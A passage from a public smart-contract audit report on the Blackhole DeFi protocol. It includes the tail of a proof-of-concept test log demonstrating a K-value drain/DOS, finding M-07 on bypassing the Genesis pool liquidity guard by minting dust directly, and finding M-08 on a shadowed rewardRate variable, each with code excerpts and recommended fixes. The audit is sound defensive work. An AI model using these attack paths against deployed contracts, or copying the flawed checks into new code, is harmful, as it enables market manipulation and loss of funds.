<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Pair</span><span class="mtk1"> </span><span class="mtk12">FRAX</span><span class="mtk1"> </span><span class="mtk12">balance</span><span class="mtk1"> </span><span class="mtk12">after</span><span class="mtk1"> drain: </span><span class="mtk7">2</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">Attempting</span><span class="mtk1"> </span><span class="mtk12">final</span><span class="mtk1"> </span><span class="mtk12">mint</span><span class="mtk1"> </span><span class="mtk12">which</span><span class="mtk1"> </span><span class="mtk12">should</span><span class="mtk1"> </span><span class="mtk12">fail</span><span class="mtk1">...</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">Test</span><span class="mtk1"> finished: </span><span class="mtk12">Successfully</span><span class="mtk1"> </span><span class="mtk12">demonstrated</span><span class="mtk1"> </span><span class="mtk12">vulnerability</span><span class="mtk1"> </span><span class="mtk12">and</span><span class="mtk1"> </span><span class="mtk12">final</span><span class="mtk1"> </span><span class="mtk12">mint</span><span class="mtk1"> </span><span class="mtk12">reverted</span><span class="mtk1">.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    ✔ </span><span class="mtk12">should</span><span class="mtk1"> </span><span class="mtk12">demonstrate</span><span class="mtk1"> </span><span class="mtk12">the</span><span class="mtk1"> </span><span class="mtk12">K</span><span class="mtk1"> </span><span class="mtk12">value</span><span class="mtk1"> </span><span class="mtk12">vulnerability</span><span class="mtk1"> </span><span class="mtk12">leading</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1"> </span><span class="mtk11">DOS</span><span class="mtk1"> (1262</span><span class="mtk12">ms</span><span class="mtk1">)</span></span></span></code></pre>
</details>
<p><strong><a href="https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues">Blackhole mitigated</a></strong></p>
<p><strong>Status:</strong> Mitigation confirmed. Full details in reports from <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-60">maxvzuvex</a> and <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-49">rayss</a>.</p>
<p>The sponsor team requested that the following note be included: </p>
<blockquote>
<p>This issue originates from the upstream codebase, inherited from ThenaV2 fork. Given that ThenaV2 has successfully operated at scale for several months without incident, we assess the severity of this issue as low. The implementation has been effectively battle-tested in a production environment, which significantly reduces the practical risk associated with this finding.
Reference: <a href="https://github.com/ThenafiBNB/THENA-Contracts/blob/main/contracts/Pair.sol#L344">https://github.com/ThenafiBNB/THENA-Contracts/blob/main/contracts/Pair.sol#L344</a></p>
</blockquote>
<hr>
<h2 style="position:relative;" id="m-07-isgenesisflag-is-ineffective-to-control-add-liquidity-flow-in-routerv2addliquidity"><a class="anchor before" aria-label="m 07 isgenesisflag is ineffective to control add liquidity flow in routerv2addliquidity permalink" href="#m-07-isgenesisflag-is-ineffective-to-control-add-liquidity-flow-in-routerv2addliquidity"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/F-168">[M-07] <code>isGenesis</code>&nbsp;flag is ineffective to control add liquidity flow in <code>RouterV2.addLiquidity()</code></a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-279">maxzuvex</a></em></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/RouterV2.sol#L384">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/RouterV2.sol#L384</a></p>
<h3 style="position:relative;" id="finding-description-5"><a class="anchor before" aria-label="finding description 5 permalink" href="#finding-description-5"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>The check that prevents external liquidity additions to “Genesis Pool” pairs before their official launch are insufficient. The <code>RouterV2.addLiquidity()</code> check can be bypassed once any LP tokens exist (even dust) and <code>Pair.mint()</code> also has no <code>isGenesis</code> check at all, letting direct initial liquidity supply. This damages the controlled launch, let potential price manipulation and launch disruption and clearly stated intended behaviour.</p>
<ol>
<li><strong><code>RouterV2.addLiquidity</code> guard issue:</strong></li>
</ol>
<pre data-index="33" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1"> </span><span class="mtk3">// contracts/RouterV2.sol</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1"> </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">addLiquidity</span><span class="mtk1">(...) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">ensure</span><span class="mtk1">(</span><span class="mtk12">deadline</span><span class="mtk1">) </span><span class="mtk11">returns</span><span class="mtk1"> ... {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     ...</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     </span><span class="mtk11">require</span><span class="mtk1">(!(</span><span class="mtk11">IBaseV1Factory</span><span class="mtk1">(</span><span class="mtk12">factory</span><span class="mtk1">).</span><span class="mtk11">isGenesis</span><span class="mtk1">(</span><span class="mtk12">pair</span><span class="mtk1">) &amp;&amp; </span><span class="mtk11">IBaseV1Pair</span><span class="mtk1">(</span><span class="mtk12">pair</span><span class="mtk1">).</span><span class="mtk11">totalSupply</span><span class="mtk1">() == </span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk8">"NA"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     </span><span class="mtk11">_safeTransferFrom</span><span class="mtk1">(</span><span class="mtk12">tokenA</span><span class="mtk1">, </span><span class="mtk12">msg</span><span class="mtk1">.</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk12">pair</span><span class="mtk1">, </span><span class="mtk12">amountA</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     </span><span class="mtk11">_safeTransferFrom</span><span class="mtk1">(</span><span class="mtk12">tokenB</span><span class="mtk1">, </span><span class="mtk12">msg</span><span class="mtk1">.</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk12">pair</span><span class="mtk1">, </span><span class="mtk12">amountB</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     </span><span class="mtk12">liquidity</span><span class="mtk1"> = </span><span class="mtk11">IBaseV1Pair</span><span class="mtk1">(</span><span class="mtk12">pair</span><span class="mtk1">).</span><span class="mtk11">mint</span><span class="mtk1">(</span><span class="mtk12">to</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1"> }</span></span></span></code></pre>
<ul>
<li>If&nbsp;<code>isGenesis(pair)</code>&nbsp;is&nbsp;true&nbsp;and&nbsp;<code>totalSupply()</code>&nbsp;is&nbsp;0, the inner condition&nbsp;<code>(true &amp;&amp; true)</code>&nbsp;is&nbsp;true. The&nbsp;<code>require(!true)</code>&nbsp;fails, correctly blocking.</li>
<li>Once <code>totalSupply &gt; 0</code> (for example after official GenesisPool launch, or a prior dust minting by an attacker), this check becomes <code>require(!(true &amp;&amp; false))</code> which is <code>require(true)</code>, allowing anyone to add liquidity using the router if the <code>isGenesis</code> flag hasn’t been cleared yet.</li>
<li>This means if <code>isGenesis</code>&nbsp;flag is not set to&nbsp;false&nbsp;immediately before&nbsp;the&nbsp;GenesisPool&nbsp;contract calls&nbsp;<code>addLiquidity</code>, then after the&nbsp;GenesisPool&nbsp;successfully adds its liquidity (making&nbsp;<code>totalSupply &gt; 0</code>), any subsequent call to&nbsp;<code>RouterV2.addLiquidity()</code>&nbsp;for that pair would pass the check, letting external LPs in prematurely.</li>
<li><strong><code>Pair.mint()</code> is not restricted:</strong></li>
</ul>
<pre data-index="34" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// contracts/Pair.sol:</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">mint</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">lock</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">liquidity</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     (</span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">_reserve0</span><span class="mtk1">, </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">_reserve1</span><span class="mtk1">) = (</span><span class="mtk12">reserve0</span><span class="mtk1">, </span><span class="mtk12">reserve1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">_balance0</span><span class="mtk1"> = </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">token0</span><span class="mtk1">).</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">_balance1</span><span class="mtk1"> = </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">token1</span><span class="mtk1">).</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">_amount0</span><span class="mtk1"> = </span><span class="mtk12">_balance0</span><span class="mtk1"> - </span><span class="mtk12">_reserve0</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">_amount1</span><span class="mtk1"> = </span><span class="mtk12">_balance1</span><span class="mtk1"> - </span><span class="mtk12">_reserve1</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">_totalSupply</span><span class="mtk1"> = </span><span class="mtk12">totalSupply</span><span class="mtk1">; </span><span class="mtk3">// gas savings, must be defined here since totalSupply can update in _mintFee</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">_totalSupply</span><span class="mtk1"> == </span><span class="mtk7">0</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">         </span><span class="mtk12">liquidity</span><span class="mtk1"> = </span><span class="mtk10">Math</span><span class="mtk1">.</span><span class="mtk11">sqrt</span><span class="mtk1">(</span><span class="mtk12">_amount0</span><span class="mtk1"> * </span><span class="mtk12">_amount1</span><span class="mtk1">) - </span><span class="mtk12">MINIMUM_LIQUIDITY</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">         </span><span class="mtk11">_mint</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk12">MINIMUM_LIQUIDITY</span><span class="mtk1">); </span><span class="mtk3">// permanently lock the first MINIMUM_LIQUIDITY tokens</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     } </span><span class="mtk15">else</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">         </span><span class="mtk12">liquidity</span><span class="mtk1"> = </span><span class="mtk10">Math</span><span class="mtk1">.</span><span class="mtk11">min</span><span class="mtk1">(</span><span class="mtk12">_amount0</span><span class="mtk1"> * </span><span class="mtk12">_totalSupply</span><span class="mtk1"> / </span><span class="mtk12">_reserve0</span><span class="mtk1">, </span><span class="mtk12">_amount1</span><span class="mtk1"> * </span><span class="mtk12">_totalSupply</span><span class="mtk1"> / </span><span class="mtk12">_reserve1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">liquidity</span><span class="mtk1"> &gt; </span><span class="mtk7">0</span><span class="mtk1">, </span><span class="mtk8">'ILM'</span><span class="mtk1">); </span><span class="mtk3">// Pair: INSUFFICIENT_LIQUIDITY_MINTED</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     </span><span class="mtk11">_mint</span><span class="mtk1">(</span><span class="mtk12">to</span><span class="mtk1">, </span><span class="mtk12">liquidity</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     </span><span class="mtk11">_update</span><span class="mtk1">(</span><span class="mtk12">_balance0</span><span class="mtk1">, </span><span class="mtk12">_balance1</span><span class="mtk1">, </span><span class="mtk12">_reserve0</span><span class="mtk1">, </span><span class="mtk12">_reserve1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">Mint</span><span class="mtk1">(</span><span class="mtk12">msg</span><span class="mtk1">.</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk12">_amount0</span><span class="mtk1">, </span><span class="mtk12">_amount1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1"> }</span></span></span></code></pre>
<ul>
<li><code>Pair.sol::mint()</code> does not have any <code>isGenesis</code> status check.</li>
<li>An attacker can transfer minimal <code>token0</code> and <code>token1</code> to a Genesis pair (where <code>isGenesis == true</code> and <code>totalSupply == 0</code>) and call <code>mint()</code> directly.</li>
<li>This mints LP tokens, makes <code>totalSupply &gt; 0</code>, and bypasses the (already weak) <code>RouterV2.addLiquidity</code> guard for that pair.</li>
</ul>
<h3 style="position:relative;" id="impact-6"><a class="anchor before" aria-label="impact 6 permalink" href="#impact-6"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>The impact isn’t a direct loss of deposited funds but is a significant disruption to a core protocol mechanism, potentially leading to unfair advantages, poor launch conditions for projects, and reduced trust. This fits a Medium severity: ”<em>Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions</em>“.</p>
<p>This is also clearly against this statement in <code>contract diff / Liquidity Pool / PairFactory</code>:
”<em>When a pair gets listed as Genesis Pool until it’s not successfully launched noone should be able to add liquidity so we’re using this <code>isGenesis</code> flag to control add liquidity flow</em>”</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-8"><a class="anchor before" aria-label="recommended mitigation steps 8 permalink" href="#recommended-mitigation-steps-8"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<ol>
<li>In <code>RouterV2.addLiquidity</code> block if the pair is a Genesis Pool, regardless of <code>totalSupply</code>.</li>
</ol>
<pre data-index="35" data-language="diff" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk8">- require(!(IBaseV1Factory(factory).isGenesis(pair) &amp;&amp; IBaseV1Pair(pair).totalSupply() == 0), "NA");</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+ require(!IBaseV1Factory(factory).isGenesis(pair), "GENESIS_POOL_LIQUIDITY_LOCKED");</span></span></span></code></pre>
<ol start="2">
<li>Restrict <code>Pair.mint()</code> for genesis pairs by adding a check in <code>Pair.sol::mint()</code>:</li>
</ol>
<pre data-index="36" data-language="diff" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">function mint(address to) external lock returns (uint liquidity) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+   require(!PairFactory(factory).isGenesis(address(this)), "GENESIS_POOL_MINT_LOCKED");</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    // ... existing mint logic ...</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p><strong><a href="https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues">Blackhole mitigated</a></strong></p>
<p><strong>Status:</strong> Mitigation confirmed. Full details in reports from <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-46">rayss</a> and <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-39">maxvzuvex</a>.</p>
<hr>
<h2 style="position:relative;" id="m-08-function-return-variable-shadowing-prevents-storage-updates-in-solidity"><a class="anchor before" aria-label="m 08 function return variable shadowing prevents storage updates in solidity permalink" href="#m-08-function-return-variable-shadowing-prevents-storage-updates-in-solidity"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/F-133">[M-08] Function return variable shadowing prevents storage updates in solidity</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-324">a39955720</a>, also found by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-480">Ekene</a></em></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/AlgebraCLVe33/GaugeCL.sol#L38">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/AlgebraCLVe33/GaugeCL.sol#L38</a></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/AlgebraCLVe33/GaugeCL.sol#L157-L183">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/AlgebraCLVe33/GaugeCL.sol#L157-L183</a></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/AlgebraCLVe33/GaugeCL.sol#L257-L259">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/AlgebraCLVe33/GaugeCL.sol#L257-L259</a></p>
<h3 style="position:relative;" id="finding-description-6"><a class="anchor before" aria-label="finding description 6 permalink" href="#finding-description-6"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>The <code>GaugeCL::notifyRewardAmount</code> function attempts to update the <code>rewardRate</code> state variable, which is meant to track the reward emission rate for the current distribution period. However, the function declares a return variable named <code>rewardRate</code> (as part of the function’s return signature), which <strong>shadows</strong> the contract-level storage variable. As a result, assignments within the function update only the local return variable, and the <strong>contract’s storage <code>rewardRate</code> is never updated</strong>.</p>
<p>This leads to the reward rate always remaining at its initial value (<code>0</code>), and any queries to <code>rewardForDuration()</code> or other on-chain users referencing <code>rewardRate</code> will receive inaccurate results.</p>
<pre data-index="37" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// @audit-issue Storage rewardRate is shadowed and never updated</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">notifyRewardAmount</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">token</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">reward</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">nonReentrant</span><span class="mtk1"> </span><span class="mtk11">isNotEmergency</span><span class="mtk1"> </span><span class="mtk11">onlyDistribution</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">IncentiveKey</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">incentivekey</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">rewardRate</span><span class="mtk1">, </span><span class="mtk12">uint128</span><span class="mtk1"> </span><span class="mtk12">bonusRewardRate</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">{</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    ...</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">timestamp</span><span class="mtk1"> &gt;= </span><span class="mtk12">_periodFinish</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">rewardRate</span><span class="mtk1"> = </span><span class="mtk12">reward</span><span class="mtk1"> / </span><span class="mtk12">DURATION</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    } </span><span class="mtk15">else</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">remaining</span><span class="mtk1"> = </span><span class="mtk12">_periodFinish</span><span class="mtk1"> - </span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">timestamp</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">leftover</span><span class="mtk1"> = </span><span class="mtk12">remaining</span><span class="mtk1"> * </span><span class="mtk12">rewardRate</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">rewardRate</span><span class="mtk1"> = (</span><span class="mtk12">reward</span><span class="mtk1"> + </span><span class="mtk12">leftover</span><span class="mtk1">) / </span><span class="mtk12">DURATION</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    ...</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<h3 style="position:relative;" id="issue-identified"><a class="anchor before" aria-label="issue identified permalink" href="#issue-identified"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Issue identified</h3>
<ul>
<li>The function’s return signature declares a local variable <code>rewardRate</code>, which <strong>shadows</strong> the contract’s storage variable of the same name.</li>
<li>All assignments to <code>rewardRate</code> within the function only affect this local variable, not the contract storage.</li>
<li>The contract storage variable <code>rewardRate</code> remains <strong>permanently zero</strong>, and is never updated by any function in the contract.</li>
<li>Consequently, the function <code>rewardForDuration()</code> always returns <code>0</code>, misleading dApps, explorers, and UIs that rely on this state variable for reward calculations.</li>
</ul>
<h3 style="position:relative;" id="risk-and-impact"><a class="anchor before" aria-label="risk and impact permalink" href="#risk-and-impact"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Risk and impact</h3>
<p><strong>Likelihood</strong>:</p>
<ul>
<li>This is a deterministic bug and will always occur if the function signature is not fixed.</li>
<li>Any user or protocol that queries <code>rewardForDuration()</code> or the public <code>rewardRate</code> will receive incorrect values.</li>
</ul>
<p><strong>Impact</strong>:</p>
<ul>
<li>Protocol dashboards, explorers, or analytic scripts may display incorrect or misleading reward information.</li>
<li>Third-party tools or automated scripts that rely on on-chain <code>rewardRate</code> data could behave incorrectly.</li>
<li>Does <strong>not</strong> directly cause loss of funds or user assets, but can lead to confusion or improper reward tracking.</li>
</ul>
